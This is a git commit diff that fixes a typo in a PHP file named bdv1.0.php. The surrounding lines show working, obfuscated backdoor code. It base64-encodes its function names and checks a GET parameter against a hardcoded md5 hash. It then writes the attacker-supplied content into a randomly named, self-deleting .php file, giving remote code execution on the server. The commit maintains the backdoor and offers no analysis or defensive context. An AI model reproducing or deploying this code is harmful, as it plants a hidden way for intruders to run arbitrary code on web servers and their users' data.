4af894cddf48ac17eb37a586f872e05effd12e26
Krunk Zhou <webmaster@krunk.cn>
2022-04-08 22:37:13 -0400

    修改错别字

--- bdv1.0.php
+++ bdv1.0.php
@@ -3,7 +3,7 @@
 if (md5($_GET[base64_decode('R0lWRU5OQg==')])==base64_decode('OTAxY2ExZGViMjRjNWI4OTY1NDdkZTYyMWExNGE5MDM='))
 {
     $OO0OOOO000 = base64_decode("cmFuZA==")(1000000, 9999999).".php";
-    $O0OO0OOOO0 = base64_decode("Zm9wZW4=")($OO0OOOO000, "w") or die("404 - NotFount");
+    $O0OO0OOOO0 = base64_decode("Zm9wZW4=")($OO0OOOO000, "w") or die("404 - NotFound");
     $O0OO0OO00O = $_GET[base64_decode('R0lWRU5OQg==')]."<?php @unlink ('".$OO0OOOO000."');?>";
     $O0OO00OO00 = base64_decode("ZndyaXRl")($O0OO0OOOO0,$O0OO0OO00O);
     $O0OO0O0O0O = base64_decode("ZmNsb3Nl")($O0OO0OOOO0);
